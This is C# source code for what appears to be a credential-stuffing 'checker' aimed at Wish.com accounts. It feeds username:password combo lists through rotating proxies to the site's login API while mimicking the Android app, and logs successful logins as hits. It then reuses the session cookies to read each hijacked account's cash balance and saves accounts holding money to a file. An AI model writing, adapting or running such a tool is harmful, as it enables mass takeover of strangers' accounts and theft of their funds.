using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Web;

namespace Wish_Checker_by_Poordev
{
    class Request
    {

        public static ProxyHandler proxyHandler = new ProxyHandler(Loading.proxyHandlerList);
        public static int Hits, Checked, CPM, CPMTimer;

        public static void Start(string Combo)
        {
            Proxies proxiesAddress = proxyHandler.NewProxy();

            MakeRequest(Combo, proxiesAddress);
        }
        private static void MakeRequest(string Combo, Proxies proxy)
        {
            CPMTimer++;

            string Username = string.Empty;
            string Password = string.Empty;

            if (Combo.Contains(":"))
            {
                Username = Combo.Split(new string[] { ":" }, StringSplitOptions.None)[0];
                Password = Combo.Split(new string[] { ":" }, StringSplitOptions.None)[1];
            }
            else if (!Combo.Contains(":")) { return; }


            var suuid = (string)null;
            var bsid = (string)null;
            var vut = (string)null;
            var locale = (string)null;
            var token = (string)null;
            var sessiontokenone = (string)null;
            var url = "https://www.wish.com/api/email-login";

            var postData = "email=" + Username + "&password=" + Password + "&session_refresh=false&app_referrer=utm_source%3Dgoogle-play%26utm_medium%3Dorganic&app_device_id=1f103df0-6e3d-3025-b107-2dd3490d29cd&securedtouch_token=&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C151%2C152%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C193%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C207%2C209%2C211%2C212%2C213%2C214%2C215%2C216%2C217%2C218%2C219%2C221%2C224%2C225%2C226%2C227&_app_type=wish&_version=4.38.0&app_device_model=Google%20Nexus%205X";

            try
            {
                var client = new RestClient("https://www.wish.com/api/email-login");
                client.Proxy = new WebProxy(proxy.Proxy);

                var request = new RestRequest(Method.POST);

                request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                request.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Google Nexus 5X Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36");
                request.AddHeader("Accept", "*/*");
                request.AddHeader("Host", "www.wish.com");
                request.AddHeader("Connection", "Keep-Alive");
                request.AddCookie("_xsrf", "1");
                request.AddParameter("text/xml", postData, ParameterType.RequestBody);
                // For the addparameter, maybe shcnage the text/xml part maybe. //yep

                var response = client.Execute(request);
                request.Resource = url;
                request.Method = Method.GET;
                foreach (var cookie in response.Cookies)
                {
                    request.AddCookie(cookie.Name, cookie.Value);  //this adds every cookie in the previous response.
                }
                var content = response.Content;

                if (content.Contains("session_token"))
                {
                    Checked++;
                    Hits++;
                    
                    var jsonData = JsonConvert.DeserializeObject<dynamic>(content);
                    sessiontokenone = jsonData.data.session_token;

                    foreach (var cookie in response.Cookies)
                    {
                        request.AddCookie(cookie.Name, cookie.Value);
                    }

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("-> [HIT] - {0}", Combo);
                    Console.ResetColor();

                    proxy.FinishedUsingProxy();
                    Wish_Checker_by_Poordev.Saving.Save(Combo, 1);

                }

                else if (content.Contains("Email or Password is incorrect"))
                {
                    Checked++;

                    proxy.FinishedUsingProxy();
                }
                else
                {
                    Checked++;

                    proxy.FinishedUsingProxy();
                    Start(Combo);
                }
                var postDataone = $"app_device_id=1f103df0-6e3d-3025-b107-2dd3490d29cd&securedtouch_token={token}&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C151%2C152%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C193%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C207%2C209%2C211%2C212%2C213%2C214%2C215%2C216%2C217%2C218%2C219%2C221%2C224%2C225%2C226%2C227&_app_type=wish&_version=4.38.0&app_device_model=Google%20Nexus%205X";

                if (content.Contains("session_token"))
                {
                    try
                    {
                        var clientone = new RestClient("https://www.wish.com/api/commerce-cash-data/get");
                        clientone.Proxy = new WebProxy(proxy.Proxy);

                        var requestone = new RestRequest(Method.POST);

                        foreach (var cookie in response.Cookies)
                        {
                            request.AddCookie(cookie.Name, cookie.Value);
                            if (cookie.Name.Contains("bsid"))
                            {
                                bsid = cookie.Value;
                            }
                            if (cookie.Name.Contains("vendor_user_tracker"))
                            {
                                vut = cookie.Value;
                            }
                            if (cookie.Name.Contains("logged_out_locale"))
                            {
                                locale = cookie.Value;       
                            }
                            if (cookie.Name.Contains("sweeper_session"))
                            {
                                suuid = cookie.Value.Replace("\"","");
                            }
                        }

                        requestone.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        requestone.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Google Nexus 5X Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36");
                        requestone.AddHeader("Connection", "Keep-Alive");
                        requestone.AddHeader("Host", "www.wish.com");
                        requestone.AddHeader("Accept-Encoding", "gzip, deflate");
                        requestone.AddHeader("Content-Length", "1864");
                        requestone.AddCookie("_xsrf", "1");
                        requestone.AddCookie("_appLocale", "en_US");
                        requestone.AddCookie("bsid", $"{bsid}");
                        requestone.AddCookie("sweeper_session", $"{suuid}");
                        requestone.AddCookie("vendor_user_tracker", $"{sessiontokenone}");
                        requestone.AddParameter("text/xml", postDataone, ParameterType.RequestBody);

                        //requestone.AddHeader("Connection", "Keep-Alive");
                        //requestone.AddCookie("Cookie", "_xsrf=1; _appLocale=en_US; bsid=" + bsid + "; sweeper_session=" + uuid + "; vendor_user_tracker=" + vut + "; _timezone=8.0; _timezone_id=Asia/Shanghai");
                        //requestone.AddParameter("text/xml", postDataone, ParameterType.RequestBody);


                        IRestResponse responseone = clientone.Execute(requestone);
                        var contentone = responseone.Content;

                        //Console.WriteLine(contentone);

                        if (contentone.Contains("amount"))
                        {
                            var pt = contentone;
                            int pFrom = pt.IndexOf("\"amount\": ") + "\"amount\": ".Length;
                            int pTo = pt.LastIndexOf(", \"symbol\"");
                            String result = pt.Substring(pFrom, pTo - pFrom);
                            result = result + 2;

                            if (result != "0.0")
                            {
                                using (FileStream cash = new FileStream("Cash Balance Accounts.txt", FileMode.Append, FileAccess.Write, FileShare.None))
                                {
                                    using (StreamWriter writer = new StreamWriter(cash))
                                    {
                                        writer.WriteLine($"[HIT]: {Combo}. Amount: {result}");

                                        cash.Flush();

                                    }
                                }
                            }
                            else
                            {

                            }
                        }
                    }

                    catch (WebException)
                    {
                        Console.WriteLine("Sorry, the web page you're trying to communicate with ");
                    }
                }
            }
            catch (WebException e)
            {
                proxy.FinishedUsingProxy();
                Start(Combo);
            }

        }
    }
}
 